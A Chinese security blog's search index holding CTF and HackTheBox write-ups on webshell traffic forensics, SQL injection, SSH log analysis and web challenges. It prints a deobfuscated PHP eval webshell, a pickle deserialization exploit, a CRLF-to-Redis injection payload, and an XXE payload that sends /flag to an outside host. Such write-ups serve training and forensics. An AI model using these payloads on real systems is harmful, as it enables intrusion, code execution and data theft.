<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2024高校网络安全管理运维赛-easyshell</title>
    <url>/article/2024%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B-easyshell.html</url>
    <content><![CDATA[<p>冰蝎流量分析</p>
<span id="more"></span>

<p>打开附件，筛选一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http &amp;&amp; ip.src==192.168.33.102</span><br></pre></td></tr></table></figure>

<p>追踪tcp流，发现具有冰蝎流量的特征</p>
<p><img src="/article/2024%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B-easyshell/image-20240506225011235.png"></p>
<p>导出http对象，保存到本地</p>
<p><img src="/article/2024%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B-easyshell/image-20240506225053452.png"></p>
<p>将shell.php内容丢到<a href="http://tools.bugscaner.com/cryptoaes/">在线网站</a>解密，这里密钥就直接猜默认密钥</p>
<p><img src="/article/2024%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B-easyshell/image-20240506224735752.png"></p>
<p>在第十个shell.php进行解密后再base64两次发现是PK头</p>
<p><img src="/article/2024%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B-easyshell/image-20240506225825504.png"></p>
<p>保存为zip文件后爆破密码<code>A8s123/+*</code>，解压后得到flag</p>
]]></content>
      <categories>
        <category>流量分析</category>
      </categories>
      <tags>
        <tag>冰蝎</tag>
      </tags>
  </entry>
  <entry>
    <title>2018信息安全铁人三项数据赛</title>
    <url>/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B.html</url>
    <content><![CDATA[<p>记录一些铁三的流量分析题</p>
<span id="more"></span>



<h1 id="题目一"><a href="#题目一" class="headerlink" title="题目一"></a>题目一</h1><p><strong>题目要求：</strong><br><strong>1.黑客攻击的第一个受害主机的网卡IP地址</strong><br><strong>2.黑客对URL的哪一个参数实施了SQL注入</strong><br><strong>3.第一个受害主机网站数据库的表前缀（加上下划线例如abc_）</strong><br><strong>4.第一个受害主机网站数据库的名字</strong></p>
<p>我们直接查看http流，注意到ip为<code>202.1.1.2</code>对<code>192.168.1.8</code>不断地发包</p>
<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240423212801277.png"></p>
<p>所以受害主机ip为<code>192.168.1.8</code></p>
<p>我们筛选一下源ip</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http &amp;&amp; ip.src==202.1.1.2</span><br></pre></td></tr></table></figure>

<p>在分组列表往下翻注意到使用sqlmap进行注入攻击，追踪tcp流</p>
<p>得到注入参数为<code>list[select]</code></p>
<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240423213600211.png"></p>
<p>我们在195流注意到响应包泄露了数据表名称前缀为<code>ajtuc</code></p>
<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240423214201938.png"></p>
<p>或者我们找到最后一次注入的payload，解码如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">list[select]=(UPDATEXML(6315,CONCAT(0x2e,0x71717a7671,(SELECT MID((IFNULL(CAST(username AS CHAR),0x20)),1,22) FROM joomla.ajtuc_users ORDER BY id LIMIT 0,1),0x71716b6b71),4235))</span><br></pre></td></tr></table></figure>

<p>得到数据库名称为<code>joomla</code></p>
<h1 id="题目二"><a href="#题目二" class="headerlink" title="题目二"></a>题目二</h1><p><strong>题目要求：<br>1.黑客第一次获得的php木马的密码是什么<br>2.黑客第二次上传php木马是什么时间<br>3.第二次上传的木马通过HTTP协议中的哪个头传递数据</strong></p>
<p>题目一已经锁定了目标ip信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip.dst == 192.168.1.8 &amp;&amp; http</span><br></pre></td></tr></table></figure>

<p>筛选一下注意到<code>/kkkaaa.php</code></p>
<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240423221618117.png"></p>
<p>追踪tcp流得到参数为zzz</p>
<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240423223256000.png"></p>
<p>获取第二个木马时间就要看POST请求</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip.dst == 192.168.1.8 &amp;&amp; http &amp;&amp; http.request.method==&quot;POST&quot;</span><br></pre></td></tr></table></figure>

<p>注意到下面这个包有参数<code>z2</code></p>
<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240423230356685.png"></p>
<p>我们将十六进制数据解码一下得到php代码（美化一下）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$p=&#x27;l&gt;]ower&quot;;$i&gt;]=$m[1][0].$m[1]&gt;][1];$h&gt;]=$&gt;]sl($ss(m&gt;]d5($i.&gt;]$kh),0&gt;],3))&gt;];$f=$s&gt;]l($s&gt;]s(md5&#x27;;</span><br><span class="line">$d=&#x27;]q=array_v&gt;]&gt;]alues(&gt;]$q);&gt;]preg_match_a&gt;]ll(&quot;/(&gt;][\\w]&gt;])[\\w-&gt;]]+&gt;](?:;q=&gt;]0.([\\d]))?,?/&quot;,&gt;&#x27;;</span><br><span class="line">$W=&#x27;),$ss(&gt;]$s[&gt;]$i],&gt;]0,$e))),$&gt;]&gt;]k)));&gt;]$o=ob_get_content&gt;]&gt;]s();ob_end_&gt;]&gt;]clean();$d=&gt;]base&#x27;;</span><br><span class="line">$e=&#x27;]T_LANGUAGE&quot;];if($rr&gt;]&amp;&amp;$&gt;]ra)&#123;$&gt;]u=pars&gt;]e_&gt;]url($rr);par&gt;]se_st&gt;]r($u[&quot;&gt;]query&quot;],$&gt;]q);$&gt;&#x27;;</span><br><span class="line">$E=&#x27;&gt;]64_e&gt;]ncod&gt;]e&gt;](&gt;]x(gz&gt;]compress($o),$k));pri&gt;]nt(&quot;&lt;$k&gt;$d&lt;&gt;]/$k&gt;&quot;&gt;])&gt;];@&gt;]session_destr&gt;]oy();&#125;&#125;&#125;&#125;&#x27;;</span><br><span class="line">$t=&#x27;($i.&gt;]$kf),0,3&gt;]));$p&gt;]=&quot;&quot;;fo&gt;]r($z=1&gt;];$z&lt;&gt;]count($m&gt;][1]);$z+&gt;]&gt;]+)$p&gt;].=$q[$m[&gt;]2][$z]];i&gt;&#x27;;</span><br><span class="line">$M=&#x27;]$ra,$&gt;]m);if($q&gt;]&amp;&amp;$m&gt;])&#123;@sessi&gt;]on_sta&gt;]&gt;]rt();$s=&amp;$&gt;]_SESS&gt;]ION;$&gt;]&gt;]s&gt;]s=&quot;substr&quot;;$sl=&quot;s&gt;]&gt;]trto&#x27;;</span><br><span class="line">$P=&#x27;]f(s&gt;]tr&gt;]pos($p&gt;],$h)===0)&#123;$s[&gt;]$i]=&quot;&quot;;$p&gt;]=$ss($&gt;]p,3);&gt;]&#125;if(ar&gt;]ray&gt;]_key_exist&gt;]&gt;]s($i,$&gt;]s)&gt;])&#123;$&gt;&#x27;;</span><br><span class="line">$j=str_replace(&#x27;fr&#x27;,&#x27;&#x27;,&#x27;cfrrfreatfrfre_funcfrtfrion&#x27;);</span><br><span class="line">$k=&#x27;];&#125;&#125;re&gt;]&gt;]turn $o;&gt;]&#125;$&gt;]r=$_SERV&gt;]ER;$rr=@$r[&gt;]&quot;HTTP&gt;]_REFERE&gt;]R&quot;];$ra&gt;]=@&gt;]$r[&quot;&gt;]HTTP_A&gt;]CC&gt;]EP&gt;&#x27;;</span><br><span class="line">$g=&#x27;&quot;&quot;;for(&gt;]$i=&gt;]0;$i&lt;$l;&gt;])&gt;]&#123;for($j=0;($j&lt;&gt;]$c&amp;&amp;&gt;]$i&lt;$l);$&gt;]j++,$i&gt;]++)&#123;$o.&gt;]=$t&#123;$i&gt;]&#125;^$k&#123;$j&#125;&gt;&#x27;;</span><br><span class="line">$R=&#x27;$k&gt;]h=&quot;cb4&gt;]2&quot;;$kf=&quot;e130&quot;&gt;];functio&gt;]n&gt;] x($t&gt;],$k)&#123;$c=s&gt;]trle&gt;]&gt;]n($k);$l=strle&gt;]n&gt;]($t)&gt;];$o=&#x27;;</span><br><span class="line">$Q=&#x27;]s[$i].=$p;$e=strp&gt;]&gt;]os(&gt;]$s[$i&gt;]],$f);if($&gt;]e)&#123;$k=$kh.$k&gt;]f;&gt;]ob_sta&gt;]rt();@e&gt;]val(@gzun&gt;]co&gt;&#x27;;</span><br><span class="line">$v=&#x27;]mpress(@x&gt;](@b&gt;]as&gt;]&gt;]e64_decode(pr&gt;]&gt;]e&gt;]g_repla&gt;]ce(array(&quot;/_/&quot;,&quot;/-/&quot;),arr&gt;]ay(&gt;]&quot;/&quot;,&quot;+&quot;&gt;]&#x27;;</span><br><span class="line">$x=str_replace(&#x27;&gt;]&#x27;,&#x27;&#x27;,$R.$g.$k.$e.$d.$M.$p.$t.$P.$Q.$v.$W.$E);</span><br><span class="line">$N=$j(&#x27;&#x27;,$x);</span><br><span class="line">$N();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>很明显是代码混淆过的，注意变量j和x，应该是可以把代码变回去</p>
<p>在结尾添加即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var_dump($j);</span><br><span class="line">var_dump($x);</span><br></pre></td></tr></table></figure>

<p>发现有eval出现，说明此包为第二次上传木马</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$kh = &quot;cb42&quot;;</span><br><span class="line">$kf = &quot;e130&quot;;</span><br><span class="line">function x($t, $k)</span><br><span class="line">&#123;</span><br><span class="line">    $c = strlen($k);</span><br><span class="line">    $l = strlen($t);</span><br><span class="line">    $o = &quot;&quot;;</span><br><span class="line">    for ($i = 0; $i &lt; $l;) &#123;</span><br><span class="line">        for ($j = 0; ($j &lt; $c &amp;&amp; $i &lt; $l); $j++, $i++) &#123;</span><br><span class="line">            $o .= $t&#123;$i&#125; ^ $k&#123;$j&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return $o;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$r = $_SERVER;</span><br><span class="line">$rr = @$r[&quot;HTTP_REFERER&quot;];</span><br><span class="line">$ra = @$r[&quot;HTTP_ACCEPT_LANGUAGE&quot;];</span><br><span class="line">if ($rr &amp;&amp; $ra) &#123;</span><br><span class="line">    $u = parse_url($rr);</span><br><span class="line">    parse_str($u[&quot;query&quot;], $q);</span><br><span class="line">    $q = array_values($q);</span><br><span class="line">    preg_match_all(&quot;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&quot;, $ra, $m);</span><br><span class="line">    if ($q &amp;&amp; $m) &#123;</span><br><span class="line">        @session_start();</span><br><span class="line">        $s =&amp; $_SESSION;</span><br><span class="line">        $ss = &quot;substr&quot;;</span><br><span class="line">        $sl = &quot;strtolower&quot;;</span><br><span class="line">        $i = $m[1][0] . $m[1][4];</span><br><span class="line">        $h = $sl($ss(md5($i . $kh), 0, 3));</span><br><span class="line">        $f = $sl($ss(md5($i . $kf), 0, 3));</span><br><span class="line">        $p = &quot;&quot;;</span><br><span class="line">        for ($z = 1; $z &lt; count($m[1]); $z++) $p .= $q[$m[2][$z]];</span><br><span class="line">        if (strpos($p, $h) === 0) &#123;</span><br><span class="line">            $s[$i] = &quot;&quot;;</span><br><span class="line">            $p = $ss($p, 3);</span><br><span class="line">        &#125;</span><br><span class="line">        if (array_key_exists($i, $s)) &#123;</span><br><span class="line">            $s[$i] .= $p;</span><br><span class="line">            $e = strpos($s[$i], $f);</span><br><span class="line">            if ($e) &#123;</span><br><span class="line">                $k = $kh . $kf;</span><br><span class="line">                ob_start();</span><br><span class="line">                @eval(@gzuncompress(@x(@base64_decode(preg_replace(array(&quot;/_/&quot;, &quot;/-/&quot;), array(&quot;/&quot;, &quot;+&quot;), $ss($s[$i], 0, $e))), $k)));</span><br><span class="line">                $o = ob_get_contents();</span><br><span class="line">                ob_end_clean();</span><br><span class="line">                $d = base64_encode(x(gzcompress($o), $k));</span><br><span class="line">                print(&quot;&lt;$k&gt;$d&lt;/$k&gt;&quot;);</span><br><span class="line">                @session_destroy();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功找到时间</p>
<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240423231540280.png"></p>
<p>上面的木马中注意到有两个http头，肯定是其中一个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$rr = @$r[&quot;HTTP_REFERER&quot;];</span><br><span class="line">$ra = @$r[&quot;HTTP_ACCEPT_LANGUAGE&quot;];</span><br></pre></td></tr></table></figure>

<p>我们追踪tcp流看一下，注意到footer.php文件</p>
<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240423231742123.png"></p>
<p>查看一下，发现referer头存在数据传递</p>
<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240423231918800.png"></p>
<h1 id="题目三"><a href="#题目三" class="headerlink" title="题目三"></a>题目三</h1><p><strong>题目要求：<br>1.内网主机的mysql用户名和请求连接的密码hash是多少(用户:密码hash)<br>2.php代理第一次被使用时最先连接了哪个IP地址</strong></p>
<p>筛选http并没有收获，所以看下tcp流</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tcp &amp;&amp; tcp contains &quot;mysql&quot;</span><br></pre></td></tr></table></figure>

<p>注意到请求长度为151的是攻击者对admin用户进行爆破，我们直接看最后一次password的hash值</p>
<p>得到答案<code>admin:1a3068c3e29e03e3bcfdba6f8669ad23349dc6c4</code></p>
<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240424220800333.png"></p>
<p>为了找出连接哪个IP，我们筛选下POST请求</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip.dst == 192.168.1.8 &amp;&amp; http &amp;&amp; http.request.method==&quot;POST&quot;</span><br></pre></td></tr></table></figure>

<p>得到第一次连接的ip为<code>4.2.2.2</code></p>
<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240424220929490.png"></p>
<h1 id="题目四"><a href="#题目四" class="headerlink" title="题目四"></a>题目四</h1><p><strong>题目要求：<br>1.黑客第一次获取到当前目录下的文件列表的漏洞利用请求发生在什么时候<br>2.黑客在内网主机中添加的用户名和密码是多少<br>3.黑客从内网服务器中下载下来的文件名</strong></p>
<p>找下出现列出文件列表的请求</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http contains &quot;system&quot; &amp;&amp; http</span><br></pre></td></tr></table></figure>

<p>可以发现有ls和dir，后经验证是dir</p>
<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240424234829936.png"></p>
<p>我们看下响应包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip.src == 192.168.2.20 &amp;&amp; http</span><br></pre></td></tr></table></figure>

<p>翻了一会找到<code>NET USER</code>命令</p>
<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240424235537584.png"></p>
<p>继续往下翻找到添加用户为kaka</p>
<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240424235818984.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">18:49:27.767754时，不存在kaka用户</span><br><span class="line">18:50:42.908737时，kaka用户已成为管理员</span><br></pre></td></tr></table></figure>

<p>所以可以断定作案时间点在这段时间内，找到后解密</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd/d&quot;C:\phpStudy\WWW\b2evolution\install\test\&quot;&amp;net user kaka kaka /add&amp;echo [S]&amp;cd&amp;echo [E]</span><br></pre></td></tr></table></figure>

<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240425000833804.png"></p>
<p>既然是下载，应该是利用中国菜刀进行下载了，那我们只过滤出post流量，查看命令即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip.dst == 192.168.2.20 &amp;&amp; http.request.method==POST</span><br></pre></td></tr></table></figure>

<p>查看最后一个解码得到<code>C:\phpStudy\WWW\b2evolution\install\test\lsass.exe_180208_185247.dmp</code></p>
]]></content>
      <categories>
        <category>流量分析</category>
      </categories>
      <tags>
        <tag>铁人三项</tag>
      </tags>
  </entry>
  <entry>
    <title>2024高校网络安全管理运维赛-web</title>
    <url>/article/2024%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B-web.html</url>
    <content><![CDATA[<p>代表福师大参加运维赛，还好最后十分钟解出来pyssrf呜呜呜</p>
<span id="more"></span>



<h2 id="pyssrf"><a href="#pyssrf" class="headerlink" title="pyssrf"></a>pyssrf</h2><p>源码如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import Flask,request</span><br><span class="line">from redis import Redis</span><br><span class="line">import hashlib</span><br><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line">import urllib</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">redis = Redis(host=&#x27;127.0.0.1&#x27;, port=6379)</span><br><span class="line"></span><br><span class="line">def get_result(url):</span><br><span class="line">    url_key=hashlib.md5(url.encode()).hexdigest()</span><br><span class="line">    res=redis.get(url_key)</span><br><span class="line">    if res:</span><br><span class="line">        return pickle.loads(base64.b64decode(res))</span><br><span class="line">    else:</span><br><span class="line">        try:</span><br><span class="line">            print(url)</span><br><span class="line">            info = urllib.request.urlopen(url)</span><br><span class="line">            res = info.read()</span><br><span class="line">            pickres=pickle.dumps(res)</span><br><span class="line">            b64res=base64.b64encode(pickres)</span><br><span class="line">            redis.set(url_key,b64res,ex=300)</span><br><span class="line">            return res</span><br><span class="line">        except urllib.error.URLError as e:</span><br><span class="line">            print(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def hello():</span><br><span class="line">    url = request.args.get(&quot;url&quot;)</span><br><span class="line">    return &#x27;&#x27;&#x27;&lt;h1&gt;give me your url via GET method like: ?url=127.0.0.1:8080&lt;h1&gt;</span><br><span class="line">    &lt;h2&gt;Here is your result&lt;/h2&gt;</span><br><span class="line">    &lt;h3&gt;source code in /source&lt;/h3&gt;</span><br><span class="line">    %s</span><br><span class="line">    &#x27;&#x27;&#x27; % get_result(&#x27;http://&#x27;+url).decode(encoding=&#x27;utf8&#x27;,errors=&#x27;ignore&#x27;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/source&#x27;)</span><br><span class="line">def source():</span><br><span class="line">    return </span><br></pre></td></tr></table></figure>

<p>分析源码，注意到<code>get_result()</code>函数有pickle反序列化</p>
<p>往前分析，前提是在连接redis的时候需要匹配到url_key键名</p>
<p>并且注意到存在urllib头部注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">info = urllib.request.urlopen(url)</span><br></pre></td></tr></table></figure>

<p><strong>思路</strong></p>
<blockquote>
<p>先访问url生成键名，然后利用urllib头部注入设置该键名值为pickle的payload，最后再访问该键名（也就是<code>127.0.0.1:6379</code>）</p>
</blockquote>
<p>我们先访问在题目生成键名（这里对应的是<code>http:127.0.0.1:6379</code>）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=127.0.0.1:6379</span><br></pre></td></tr></table></figure>

<p>然后在本地运行脚本生成对应MD5值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import urllib</span><br><span class="line">import hashlib</span><br><span class="line">from flask import Flask,request</span><br><span class="line">url=&#x27;http://127.0.0.1:6379&#x27;</span><br><span class="line">url_key=hashlib.md5(url.encode()).hexdigest()</span><br><span class="line">print(url_key)</span><br></pre></td></tr></table></figure>

<p>利用报错回显，pickle反序列化exp如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line">import os</span><br><span class="line"> </span><br><span class="line">class A():</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (exec,(&quot;raise Exception(__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read())&quot;,))</span><br><span class="line"> </span><br><span class="line">a = A()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line">print(base64.b64encode(b))</span><br></pre></td></tr></table></figure>

<p>然后利用urllib头部注入修改前面键名的值为payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379?</span><br><span class="line">set cbdecc92165b29374b6b62cca016d4f8 gASVVwAAAAAAAACMCGJ1aWx0aW5zlIwEZXhlY5STlIw7cmFpc2UgRXhjZXB0aW9uKF9faW1wb3J0X18oJ29zJykucG9wZW4oJ2NhdCAvZmxhZycpLnJlYWQoKSmUhZRSlC4=</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p>丢到cyberchef编码一下</p>
<p><img src="/article/2024%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B-web/image-20240506213415136.png"></p>
<p>直接传payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=127.0.0.1:6379?%0d%0aset cbdecc92165b29374b6b62cca016d4f8 gASVVwAAAAAAAACMCGJ1aWx0aW5zlIwEZXhlY5STlIw7cmFpc2UgRXhjZXB0aW9uKF9faW1wb3J0X18oJ29zJykucG9wZW4oJ2NhdCAvZmxhZycpLnJlYWQoKSmUhZRSlC4=%0d%0asave</span><br></pre></td></tr></table></figure>

<p>然后再访问<code>127.0.0.1:6379</code>就可以看到修改后的flag</p>
<p><img src="/article/2024%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B-web/image-20240506205730515.png"></p>
<h2 id="fileit"><a href="#fileit" class="headerlink" title="fileit"></a>fileit</h2><blockquote>
<p>xxe无回显</p>
</blockquote>
<p>bp抓包修改POST请求方式，添加数据（注意content-type为xml）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &#x27;http://5i781963p2.yicp.fun:80/test.dtd&#x27;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/article/2024%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B-web/image-20240506194841777.png"></p>
<p>test.dtd文件（注意<code>%</code>要改成<code>&amp;#37;</code>）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://5i781963p2.yicp.fun:80?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>本地开启http服务，成功外带flag</p>
<p><img src="/article/2024%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B-web/image-20240506194620542.png"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>SSRF</tag>
        <tag>pickle反序列化</tag>
        <tag>CRLF</tag>
      </tags>
  </entry>
  <entry>
    <title>Brutus-HackTheBox</title>
    <url>/article/Brutus-HackTheBox.html</url>
    <content><![CDATA[<p>wtmp日志文件</p>
<span id="more"></span>



<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><blockquote>
<p>在这个非常简单的 Sherlock 中，您将熟悉 Unix auth.log 和 wtmp 日志。我们将探讨通过 SSH 服务对 Confluence  服务器进行暴力破解的场景。获得服务器访问权限后，攻击者执行了其他活动，我们可以使用 auth.log 进行跟踪。尽管 auth.log  主要用于暴力分析，但我们将在调查中深入研究此工件的全部潜力，包括权限升级、持久性，甚至对命令执行的一些可见性。</p>
</blockquote>
<h1 id="Task1"><a href="#Task1" class="headerlink" title="Task1"></a>Task1</h1><p><strong>通过分析auth.log，能否识别出攻击者进行暴力攻击所使用的IP地址？</strong></p>
<p>打开日志文件，发现ip为<code>65.2.161.68</code>在尝试登录admin用户</p>
<p><img src="/article/Brutus-HackTheBox/image-20240421223335647.png"></p>
<h1 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h1><p><strong>暴力尝试成功，攻击者获得了服务器上帐户的访问权限。该帐户的用户名是什么？</strong></p>
<p>我们在对成功登录的日志记录下来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mar  6 06:19:54 ip-172-31-35-28 sshd[1465]: Accepted password for root from 203.101.190.9 port 42825 ssh2</span><br><span class="line">Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2</span><br><span class="line">Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: Accepted password for cyberjunkie from 65.2.161.68 port 43260 ssh2</span><br></pre></td></tr></table></figure>

<p>不难发现第二次和第三次是攻击者登录的，对应ip为<code>65.2.161.68</code></p>
<p>所以在尝试连续的爆破密码后，成功登录的是root用户</p>
<p><img src="/article/Brutus-HackTheBox/image-20240421223811885.png"></p>
<h1 id="Task3"><a href="#Task3" class="headerlink" title="Task3"></a>Task3</h1><p><strong>您能否识别攻击者手动登录服务器以实现其目标的时间戳？</strong></p>
<p>在前一问可以知道<code>65.2.161.68</code>为攻击者ip，再来看看题目给的wtmp文件</p>
<blockquote>
<p><code>wtmp</code> 是跟踪 Linux 系统上登录和注销事件的三个文件之一。 <code>/var/run/utmp</code> 跟踪当前登录的用户。 <code>/var/log/wtmp</code> 保留登录和注销活动的历史日志。 <code>/var/log/btmp</code> 保留无效登录尝试的记录。</p>
</blockquote>
<p>我们用工具utmpdump打开，可以看到<code>65.2.161.68</code>进行了root用户登录，也就是说是攻击者手动登陆的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2024-03-06 06:32:45</span><br></pre></td></tr></table></figure>

<p><img src="/article/Brutus-HackTheBox/image-20240421224859079.png"></p>
<h1 id="Task4"><a href="#Task4" class="headerlink" title="Task4"></a>Task4</h1><p><strong>SSH 登录会话会被跟踪并在登录时分配一个session。对于问题 2 中的用户帐户，分配给攻击者会话的session是多少？</strong></p>
<p>我们在前面分析过<code>06:32:45</code>为攻击者登录时间，所以分析log日志文件后得到session为37</p>
<p><img src="/article/Brutus-HackTheBox/image-20240421230448152.png"></p>
